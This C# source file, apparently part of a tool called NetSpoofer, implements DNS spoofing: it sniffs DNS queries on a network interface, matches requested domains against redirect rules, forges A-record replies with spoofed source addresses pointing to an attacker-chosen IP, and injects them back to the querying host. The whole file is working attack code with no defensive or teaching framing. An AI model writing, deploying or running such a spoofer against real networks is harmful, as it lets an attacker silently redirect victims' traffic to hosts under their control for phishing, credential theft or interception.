using PacketDotNet;
using SharpPcap;
using System;
using System.Collections.ObjectModel;
using System.Linq;
using System.Net;
using System.Text;
using System.Net.NetworkInformation;

namespace NetSpoofer {
    public class DnsSpoofer {
        private readonly PhysicalAddressEx _nicMac;
        private readonly ObservableCollection<DnsRule> _rules;
        public DnsSpoofer(CaptureManager cap, PhysicalAddressEx nicMac, ObservableCollection<DnsRule> rules) { _nicMac = nicMac; _rules = rules; }
        public void Stop() { }

        public void Process(Packet packet, ICaptureDevice dev) {
            var eth = packet.Extract<EthernetPacket>();
            var ip = packet.Extract<IPv4Packet>();
            var udp = packet.Extract<UdpPacket>();
            if (eth == null || ip == null || udp == null) return;
            if (udp.DestinationPort != 53) return; // DNS query
            var queryBytes = udp.PayloadData;
            if (queryBytes == null || queryBytes.Length < 12) return;
            var txId = (ushort)((queryBytes[0] << 8) | queryBytes[1]);
            var flags = (ushort)((queryBytes[2] << 8) | queryBytes[3]);
            bool isQuery = ((flags & 0x8000) == 0);
            if (!isQuery) return;
            var q = DnsParser.ParseQuestion(queryBytes);
            if (q == null) return;
            var domain = q.Value.name.ToLowerInvariant();
            var rule = _rules.FirstOrDefault(r => domain == r.Domain || domain.EndsWith("." + r.Domain));
            if (rule == null) return;

            var respPayload = DnsParser.BuildAResponse(txId, q.Value, rule.RedirectTo);
            var respUdp = new UdpPacket(53, udp.SourcePort) { PayloadData = respPayload };
            var respIp = new IPv4Packet(ip.DestinationAddress, ip.SourceAddress) { Protocol = ProtocolType.Udp };
            respUdp.UpdateCalculatedValues(); respUdp.Checksum = 0; respUdp.UpdateCalculatedValues();
            respIp.PayloadPacket = respUdp; respIp.UpdateCalculatedValues();
            var respEth = new EthernetPacket(new PhysicalAddress(_nicMac.Bytes), eth.SourceHardwareAddress, EthernetType.IPv4) { PayloadPacket = respIp };
            var bytes = respEth.Bytes;
            var inj = dev as IInjectionDevice;
            inj?.SendPacket(bytes);
        }
    }

    public static class DnsParser {
        public static (string name, ushort type, ushort klass)? ParseQuestion(byte[] msg) {
            try {
                int idx = 12; string name = ReadName(msg, ref idx);
                ushort type = (ushort)((msg[idx++] << 8) | msg[idx++]);
                ushort klass = (ushort)((msg[idx++] << 8) | msg[idx++]);
                return (name, type, klass);
            } catch { return null; }
        }
        private static string ReadName(byte[] msg, ref int idx) {
            var parts = new System.Collections.Generic.List<string>();
            while (true) {
                int len = msg[idx++]; if (len == 0) break; parts.Add(Encoding.ASCII.GetString(msg, idx, len)); idx += len;
            }
            return string.Join('.', parts);
        }
        public static byte[] BuildAResponse(ushort txId, (string name, ushort type, ushort klass) q, IPAddress ip) {
            var nameParts = q.name.Split('.'); var nameLen = nameParts.Sum(p => 1 + Encoding.ASCII.GetByteCount(p)) + 1;
            var header = new byte[12]; header[0] = (byte)(txId >> 8); header[1] = (byte)(txId & 0xFF);
            header[2] = 0x81; header[3] = 0x80; // standard response, no error
            header[4] = 0x00; header[5] = 0x01; // qdcount
            header[6] = 0x00; header[7] = 0x01; // ancount
            header[8] = header[9] = header[10] = header[11] = 0x00; // nscount, arcount
            var qbuf = new byte[nameLen + 4]; int idx = 0;
            foreach (var part in nameParts) { var b = Encoding.ASCII.GetBytes(part); qbuf[idx++] = (byte)b.Length; Buffer.BlockCopy(b, 0, qbuf, idx, b.Length); idx += b.Length; }
            qbuf[idx++] = 0; qbuf[idx++] = (byte)(q.type >> 8); qbuf[idx++] = (byte)(q.type & 0xFF); qbuf[idx++] = (byte)(q.klass >> 8); qbuf[idx++] = (byte)(q.klass & 0xFF);
            var ans = new byte[nameLen + 10 + 4]; idx = 0;
            foreach (var part in nameParts) { var b = Encoding.ASCII.GetBytes(part); ans[idx++] = (byte)b.Length; Buffer.BlockCopy(b, 0, ans, idx, b.Length); idx += b.Length; }
            ans[idx++] = 0; // name end
            ans[idx++] = 0x00; ans[idx++] = 0x01; // type A
            ans[idx++] = 0x00; ans[idx++] = 0x01; // class IN
            ans[idx++] = 0x00; ans[idx++] = 0x00; ans[idx++] = 0x00; ans[idx++] = 0x3C; // TTL 60s
            ans[idx++] = 0x00; ans[idx++] = 0x04; // rdlength
            var ipb = ip.GetAddressBytes(); Buffer.BlockCopy(ipb, 0, ans, idx, 4);
            var result = new byte[header.Length + qbuf.Length + ans.Length];
            Buffer.BlockCopy(header, 0, result, 0, header.Length);
            Buffer.BlockCopy(qbuf, 0, result, header.Length, qbuf.Length);
            Buffer.BlockCopy(ans, 0, result, header.Length + qbuf.Length, ans.Length);
            return result;
        }
    }
}